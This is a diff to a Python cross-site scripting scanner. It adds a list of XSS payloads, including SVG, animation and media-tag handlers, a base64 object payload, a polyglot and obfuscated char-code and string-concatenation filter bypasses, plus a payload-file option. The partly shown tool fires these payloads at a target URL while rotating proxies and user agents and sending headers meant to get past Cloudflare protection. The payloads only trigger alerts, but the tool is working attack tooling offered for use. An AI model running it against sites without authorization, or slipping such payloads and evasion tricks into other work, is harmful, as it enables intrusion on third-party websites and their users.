@@ -8,6 +8,7 @@ from fake_useragent import UserAgent
 from urllib.parse import urlparse
 from typing import List, Dict
 import logging
+import os
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -20,12 +21,28 @@ PROXY_POOL = [
     # Add real proxies here or leave empty
 ]
 
-# Common payloads for XSS (can be expanded)
-XSS_PAYLOADS = [
+# Default XSS payloads (updated with latest from X and other sources as of March 2025)
+DEFAULT_XSS_PAYLOADS = [
+    # From X posts
+    "</script><script>alert(1234)</script>",  # From @shivangmauryaa, March 17, 2025
+    "cv.pdf<img src=nothing onerror=alert('chux')>",  # From @chux13786509, March 7, 2025 (file upload XSS)
+    
+    # Classic and still effective payloads
     "<script>alert('xss')</script>",
     "<img src=x onerror=alert('xss')>",
     "javascript:alert('xss')",
     "'><script>alert('xss')</script>",
+    
+    # Modern payloads from PortSwigger 2024 Cheat Sheet and other sources
+    "<svg onload=alert(1)>",  # Common SVG payload
+    "<style>@keyframes x{}</style><xss style='animation-name:x' onanimationend=alert(1)>",  # Animation-based
+    "<video><source onerror=alert(1)>",  # Media tag payload
+    "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",  # Base64 encoded
+    
+    # Polyglot and bypass payloads
+    "javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>",  # Polyglot from OWASP
+    "<img src='x' onerror='window[\"al\"+\"ert\"](1)'>",  # Obfuscated alert
+    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",  # Char code bypass
 ]
 
 # Cloudflare bypass headers
@@ -49,7 +66,6 @@ def get_random_proxy() -> Dict[str, str]:
         return {}
     proxy = random.choice(PROXY_POOL)
     try:
-        # Validate proxy format
         if not proxy.startswith(('http://', 'https://')) or ':' not in proxy:
             raise ValueError(f"Invalid proxy format: {proxy}")
         return {'http': proxy, 'https': proxy}
@@ -72,6 +88,23 @@ def is_cloudflare_blocked(response: requests.Response) -> bool:
         logger.debug("Cloudflare headers detected")
         return True
     return False
+
+# Load payloads from a file
+def load_payloads_from_file(file_path: str) -> List[str]:
+    if not os.path.exists(file_path):
+        logger.error(f"Payload file '{file_path}' not found. Falling back to default payloads.")
+        return DEFAULT_XSS_PAYLOADS
+    try:
+        with open(file_path, 'r', encoding='utf-8') as f:
+            payloads = [line.strip() for line in f if line.strip()]
+        if not payloads:
+            logger.warning("Payload file is empty. Falling back to default payloads.")
+            return DEFAULT_XSS_PAYLOADS
+        logger.info(f"Loaded {len(payloads)} payloads from '{file_path}'")
+        return payloads
+    except Exception as e:
+        logger.error(f"Failed to read payload file '{file_path}': {e}. Falling back to default payloads.")
+        return DEFAULT_XSS_PAYLOADS
 
 # Main function to test XSS with Cloudflare bypass
 def test_xss(target_url: str, payloads: List[str], timeout: int = 10, retries: int = 3) -> None:
@@ -135,10 +168,18 @@ def main():
     parser.add_argument('-u', '--url', required=True, help='Target URL to test')
     parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout in seconds')
     parser.add_argument('-r', '--retries', type=int, default=3, help='Number of retries on failure')
+    parser.add_argument('-p', '--payload-file', help='Path to a text file containing XSS payloads')
     args = parser.parse_args()
 
+    # Load payloads
+    if args.payload_file:
+        payloads = load_payloads_from_file(args.payload_file)
+    else:
+        payloads = DEFAULT_XSS_PAYLOADS
+        logger.info(f"No payload file specified. Using {len(payloads)} default payloads.")
+
     logger.info(f"Starting XSS test on {args.url}")
-    test_xss(args.url, XSS_PAYLOADS, args.timeout, args.retries)
+    test_xss(args.url, payloads, args.timeout, args.retries)
     logger.info("Test completed")
 
 if __name__ == "__main__":
